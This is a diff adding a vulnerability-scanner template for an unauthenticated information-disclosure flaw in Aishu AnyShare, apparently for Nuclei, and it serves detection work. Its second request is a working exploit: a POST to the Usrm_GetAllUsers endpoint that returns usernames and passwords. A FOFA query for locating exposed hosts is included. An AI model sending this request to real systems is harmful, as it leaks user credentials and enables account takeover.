@@ -1,0 +1,50 @@
+id: aishu-anyshare-information-disclosure
+
+info:
+  name: Aishu AnyShare - Information Disclosure
+  author: s4e-io
+  severity: high
+  description: |
+    Aishu AnyShare intelligent content management platform Usrm_GetAllUsers interface has an information disclosure vulnerability, and unauthenticated attackers can obtain sensitive information such as usernames and passwords. You can log in to the background and put the system in a highly insecure state.
+  remediation: |
+    Ensure that the endpoint is protected and only accessible by authenticated and authorized users. Implement proper access controls and validate user permissions.
+  reference:
+    - https://cn-sec.com/archives/3431184.html
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: aishu
+    product: anyshare
+    fofa-query: app="AISHU-AnyShare"
+  tags: aishu-anyshare,information-disclosure
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "ShareWeb")'
+          - 'status_code == 200'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /api/ShareMgnt/Usrm_GetAllUsers HTTP/1.1
+        Host: {{Hostname}}
+
+        [1,100]
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body, "directDeptInfo", "loginName", "password")'
+          - 'contains(content_type, "application/json")'
+          - 'status_code == 200'
+        condition: and
